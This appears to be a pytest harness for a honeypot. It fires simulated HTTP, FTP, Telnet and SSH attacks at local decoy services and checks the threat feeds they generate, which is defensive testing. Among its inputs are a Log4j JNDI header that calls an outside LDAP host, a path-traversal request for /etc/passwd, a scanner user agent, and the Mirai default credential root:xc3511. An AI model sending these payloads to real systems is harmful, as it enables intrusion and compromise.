"""
tests/test_harness.py
─────────────────────
Enterprise Multi-Protocol Intrusion Simulator & Verification Suite.
Exercises SSH (VFS sandbox & keystrokes), HTTP (.env, Log4j, XML-RPC, Gzip bomb),
FTP (RFC 959), Telnet (RFC 854 Mirai IoT), and verifies threat dossiers, Snort rules,
STIX 2.1, and CEF syslog pipelines.
"""

import asyncio
import os
from pathlib import Path
import socket
import sys

# Ensure project root is in sys.path
PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

import threading
import time
from typing import Any, Dict
import paramiko
import pytest
import requests
import uvicorn

from core.config import settings

TARGET_HOST = "127.0.0.1"


@pytest.fixture(scope="session", autouse=True)
def ensure_honeypot_running():
    """Ensure the honeypot background grid is operational for test execution."""
    server_running = False
    try:
        r = requests.get(f"http://{TARGET_HOST}:{settings.API_PORT}/api/v1/health", timeout=1.0)
        if r.status_code == 200:
            server_running = True
    except Exception:
        server_running = False

    if not server_running:
        from api.server import app
        config = uvicorn.Config(app, host=TARGET_HOST, port=settings.API_PORT, log_level="warning")
        server = uvicorn.Server(config)
        server_thread = threading.Thread(target=server.run, daemon=True)
        server_thread.start()
        for _ in range(25):
            time.sleep(0.4)
            try:
                r = requests.get(f"http://{TARGET_HOST}:{settings.API_PORT}/api/v1/health", timeout=1.0)
                if r.status_code == 200:
                    break
            except Exception:
                pass
    yield


def test_http_decoy() -> None:
    """Simulate web attack vectors: credential leak, admin brute-force, Log4Shell, and scanner probe."""
    print("\n[+] Testing HTTP Decoy on port", settings.HTTP_PORT)
    base_url = f"http://{TARGET_HOST}:{settings.HTTP_PORT}"

    # 1. Test .env credential harvester lure
    resp_env = requests.get(f"{base_url}/.env", timeout=5)
    assert resp_env.status_code == 200, f"Expected 200 for /.env, got {resp_env.status_code}"
    assert "DB_PASSWORD=" in resp_env.text, "Fake credentials missing from /.env"
    print("    [✓] /.env leak lure verified (captured DB_PASSWORD)")

    # 2. Test admin login portal brute force
    resp_login = requests.post(
        f"{base_url}/wp-login.php",
        data={"log": "admin_root", "pwd": "MaliciousPassword2026!"},
        timeout=5
    )
    assert resp_login.status_code == 401, f"Expected 401 for bad auth, got {resp_login.status_code}"
    print("    [✓] /wp-login.php brute force credential interception verified")

    # 3. Test WordPress XML-RPC multicall trap
    resp_xml = requests.post(f"{base_url}/xmlrpc.php", data="<methodCall><methodName>system.multicall</methodName></methodCall>", timeout=5)
    assert resp_xml.status_code == 200
    assert "faultCode" in resp_xml.text
    print("    [✓] /xmlrpc.php WordPress multicall brute-force trap verified")

    # 4. Test Spring Actuator discovery
    resp_actuator = requests.get(f"{base_url}/actuator/health", timeout=5)
    assert resp_actuator.status_code == 200, "Actuator health endpoint failed"
    assert resp_actuator.json().get("status") == "UP"
    print("    [✓] /actuator/health Spring Boot decoy verified")

    # 5. Test Log4j JNDI injection detection
    jndi_header = "${jndi:ldap://198.51.100.22:1389/Exploit}"
    resp_log4j = requests.get(f"{base_url}/api/v1/query", headers={"X-Api-Version": jndi_header}, timeout=5)
    assert resp_log4j.status_code == 502
    print("    [✓] Log4j JNDI exploit header intercepted and flagged")

    # 6. Test Scanner detection / Gzip Defense trigger
    resp_scan = requests.get(
        f"{base_url}/../../etc/passwd",
        headers={"User-Agent": "sqlmap/1.6.12#stable"},
        timeout=10
    )
    assert resp_scan.status_code == 200, "Active defense probe failed"
    assert len(resp_scan.content) == 10_000_000, f"Expected 10MB decompressed bomb, got {len(resp_scan.content)}"
    print("    [✓] Active Defense Gzip Bomb triggered on path traversal/scanner probe (10MB payload safely expanded)")


def test_ftp_decoy() -> None:
    """Connect to FTP port 2121, verify banner, and attempt authentication."""
    print("\n[+] Testing FTP Decoy on port", settings.FTP_PORT)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5.0)

    try:
        s.connect((TARGET_HOST, settings.FTP_PORT))
        banner = s.recv(1024).decode("utf-8", "ignore")
        assert "220 ProFTPD" in banner, f"Unexpected FTP banner: {banner}"
        print("    [✓] ProFTPD banner verified:", banner.strip())

        # Send USER
        s.sendall(b"USER superadmin\r\n")
        resp_user = s.recv(1024).decode("utf-8", "ignore")
        assert "331" in resp_user, f"Expected 331, got: {resp_user}"

        # Send PASS
        s.sendall(b"PASS P@ssword123\r\n")
        resp_pass = s.recv(1024).decode("utf-8", "ignore")
        assert "530" in resp_pass, f"Expected 530 Login incorrect, got: {resp_pass}"
        print("    [✓] FTP credential harvesting verified (superadmin:P@ssword123 rejected with 530)")
    finally:
        s.close()


def test_telnet_decoy() -> None:
    """Connect to Telnet port 2323 and simulate Mirai IoT botnet brute-force combo."""
    print("\n[+] Testing Telnet Decoy on port", settings.TELNET_PORT)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5.0)

    try:
        s.connect((TARGET_HOST, settings.TELNET_PORT))
        banner = ""
        for _ in range(5):
            chunk = s.recv(1024).decode("utf-8", "ignore")
            banner += chunk
            if "login:" in banner.lower() or "ubuntu" in banner.lower():
                break
            time.sleep(0.1)

        assert "login:" in banner.lower() or "ubuntu" in banner.lower(), f"Unexpected banner: {banner}"
        print("    [✓] Telnet login prompt verified")

        s.sendall(b"root\r\n")
        time.sleep(0.2)

        prompt = ""
        for _ in range(5):
            chunk = s.recv(1024).decode("utf-8", "ignore")
            prompt += chunk
            if "password" in prompt.lower():
                break
            time.sleep(0.1)

        assert "password" in prompt.lower(), f"Expected Password prompt, got: {prompt}"

        s.sendall(b"xc3511\r\n")
        time.sleep(0.2)

        resp = ""
        for _ in range(5):
            chunk = s.recv(1024).decode("utf-8", "ignore")
            resp += chunk
            if "incorrect" in resp.lower() or "login:" in resp.lower():
                break
            time.sleep(0.1)

        assert "incorrect" in resp.lower() or "login:" in resp.lower()
        print("    [✓] Telnet Mirai botnet combo harvested (root:xc3511)")
    finally:
        s.close()


def test_ssh_decoy() -> None:
    """Connect to SSH decoy on port 2222, test Virtual File System (VFS) persistence, and exit."""
    print("\n[+] Testing SSH Decoy on port", settings.SSH_PORT)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname=TARGET_HOST,
            port=settings.SSH_PORT,
            username="root",
            password="toor_password_2026",
            timeout=5.0,
            allow_agent=False,
            look_for_keys=False
        )
        print("    [✓] SSH Authentication accepted (lure successful)")

        channel = client.invoke_shell()
        time.sleep(0.5)
        banner = channel.recv(2048).decode("utf-8", "ignore")
        assert "Ubuntu" in banner, f"Missing Ubuntu banner: {banner}"
        print("    [✓] Interactive shell prompt received")

        # Test whoami
        channel.send("whoami\r\n")
        time.sleep(0.4)
        out_whoami = channel.recv(1024).decode("utf-8", "ignore")
        assert "root" in out_whoami

        # Test VFS: echo payload > /tmp/trojan.sh
        channel.send("echo 'exec evil' > /tmp/trojan.sh\r\n")
        time.sleep(0.5)
        channel.recv(1024)

        # Test VFS: cat /tmp/trojan.sh
        channel.send("cat /tmp/trojan.sh\r\n")
        time.sleep(0.5)
        out_vfs = channel.recv(1024).decode("utf-8", "ignore")
        assert "evil" in out_vfs, f"VFS state write failed: {out_vfs}"
        print("    [✓] Virtual File System (VFS) stateful write/read validated (/tmp/trojan.sh)")

        # Test VFS: cd /etc && pwd
        channel.send("cd /etc\r\npwd\r\n")
        time.sleep(0.4)
        out_pwd = channel.recv(1024).decode("utf-8", "ignore")
        assert "/etc" in out_pwd
        print("    [✓] VFS directory traversal (cd /etc) validated")

        # Clean exit
        channel.send("exit\r\n")
        time.sleep(0.2)
        channel.close()
        client.close()
    except Exception as exc:
        print("    [✗] SSH Test failed:", exc)
        client.close()
        raise exc


def test_api_and_feeds() -> None:
    """Verify that all intrusions were classified and ingested into dossiers and threat feeds."""
    print("\n[+] Testing Telemetry API and Threat Intelligence Feeds on port", settings.API_PORT)
    api_base = f"http://{TARGET_HOST}:{settings.API_PORT}"

    time.sleep(1.0)

    # 1. Check System Stats
    res_stats = requests.get(f"{api_base}/api/v1/stats", timeout=5)
    assert res_stats.status_code == 200, f"Stats failed: {res_stats.status_code}"
    stats = res_stats.json()
    assert stats["total_attacks"] >= 4
    assert "avg_risk_score" in stats
    assert "top_fingerprints" in stats
    print(f"    [✓] Enterprise stats validated ({stats['total_attacks']} events, Avg Risk: {stats['avg_risk_score']})")

    # 2. Check Threat Actor Dossier Endpoint
    res_dossier = requests.get(f"{api_base}/api/v1/attacker/127.0.0.1", timeout=5)
    assert res_dossier.status_code == 200
    dossier = res_dossier.json()
    assert "max_risk_score" in dossier
    assert "primary_fingerprint" in dossier
    print(f"    [✓] Threat Actor Dossier (/api/v1/attacker/127.0.0.1) confirmed: {dossier['primary_fingerprint']} (Risk: {dossier['max_risk_score']})")

    # 3. Check Automated Snort / Suricata NIDS Rule Signatures
    res_snort = requests.get(f"{api_base}/api/v1/feed/snort.rules", timeout=5)
    assert res_snort.status_code == 200
    assert "alert ip" in res_snort.text or "# Honeypot-System" in res_snort.text
    print("    [✓] Automated Snort/Suricata NIDS Rules (/api/v1/feed/snort.rules) active")

    # 4. Check OpenCTI / MISP Structured IOCs
    res_iocs = requests.get(f"{api_base}/api/v1/feed/iocs.json", timeout=5)
    assert res_iocs.status_code == 200
    iocs_data = res_iocs.json()
    assert "iocs" in iocs_data
    print(f"    [✓] Machine-Readable IOC Feed (/api/v1/feed/iocs.json) active ({iocs_data['total_iocs']} indicators)")

    # 5. Check ArcSight CEF Syslog Export
    res_cef = requests.get(f"{api_base}/api/v1/feed/syslog.cef", timeout=5)
    assert res_cef.status_code == 200
    assert "CEF:0|Honeypot-System" in res_cef.text
    print("    [✓] ArcSight CEF Syslog Feed (/api/v1/feed/syslog.cef) compliant")

    # 6. Check Firewall CIDR Blocklist
    res_fw = requests.get(f"{api_base}/api/v1/feed/firewall.txt", timeout=5)
    assert res_fw.status_code == 200
    print("    [✓] Firewall CIDR Feed (/api/v1/feed/firewall.txt) active")

    # 7. Check OASIS STIX 2.1 Threat Intel Bundle
    res_stix = requests.get(f"{api_base}/api/v1/feed/stix.json", timeout=5)
    assert res_stix.status_code == 200
    assert res_stix.json().get("type") == "bundle"
    print("    [✓] STIX 2.1 Threat Intel Bundle (/api/v1/feed/stix.json) compliant")


def run_full_suite():
    """Run all test vectors sequentially and output results banner."""
    print("=" * 72)
    print("  HONEYPOT-SYSTEM v2.0 ENTERPRISE - ATTACK SIMULATION SUITE")
    print("=" * 72)

    passed = 0
    total = 5

    tests = [
        ("HTTP Decoy", test_http_decoy),
        ("FTP Decoy", test_ftp_decoy),
        ("Telnet Decoy", test_telnet_decoy),
        ("SSH Decoy", test_ssh_decoy),
        ("API, Threat Dossiers & Feeds", test_api_and_feeds),
    ]

    for name, test_fn in tests:
        try:
            test_fn()
            passed += 1
        except Exception as e:
            print(f"    [✗] {name} encountered an error: {e}")

    print("\n" + "=" * 72)
    print(f"  TEST RESULTS: {passed}/{total} Test Vectors Passed Successfully.")
    print("=" * 72)

    if passed != total:
        sys.exit(1)


if __name__ == "__main__":
    server_running = False
    try:
        r = requests.get(f"http://{TARGET_HOST}:{settings.API_PORT}/api/v1/health", timeout=1.0)
        if r.status_code == 200:
            server_running = True
    except Exception:
        server_running = False

    if not server_running:
        print("[*] Launching Honeypot server in background thread for testing...")
        from api.server import app
        
        config = uvicorn.Config(app, host=TARGET_HOST, port=settings.API_PORT, log_level="warning")
        server = uvicorn.Server(config)
        
        server_thread = threading.Thread(target=server.run, daemon=True)
        server_thread.start()
        
        for _ in range(15):
            time.sleep(0.5)
            try:
                r = requests.get(f"http://{TARGET_HOST}:{settings.API_PORT}/api/v1/health", timeout=1.0)
                if r.status_code == 200:
                    print("[*] Background Honeypot server is online and healthy.")
                    break
            except Exception:
                pass

    run_full_suite()
